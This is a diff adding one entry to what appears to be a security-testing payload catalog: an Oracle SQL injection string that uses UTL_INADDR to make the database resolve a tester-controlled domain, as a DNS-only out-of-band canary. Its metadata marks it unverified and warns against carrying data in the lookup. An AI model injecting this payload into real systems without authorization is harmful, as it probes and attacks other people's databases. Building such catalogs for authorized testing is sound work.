@@ -1,0 +1,25 @@
+id: web-sqli-out-of-band-oracle-dns-canary-001
+schema_version: 1
+technique_id: web-sqli-out-of-band
+name: Oracle DNS-only canary
+content: ''' AND UTL_INADDR.get_host_address(''<unique-id>.<controlled-domain>'') IS NOT NULL-- '
+target_technology: Oracle Database
+technology_versions: []
+injection_context: quoted-string
+encoding: none
+expected_behavior: On eligible Oracle configurations where the account has required privileges and DNS
+  egress is permitted, this may trigger name resolution. A callback proves resolution only; do not encode
+  query output or secrets.
+waf_bypass_for: []
+related_payload: null
+review:
+  status: unverified
+  last_tested: null
+  tested_against: []
+  evidence: []
+references:
+- https://portswigger.net/web-security/sql-injection/cheat-sheet
+- https://docs.oracle.com/en/database/oracle/oracle-database/23/arpls/UTL_INADDR.html
+source: original
+adapted_from: null
+license: pending-policy-review
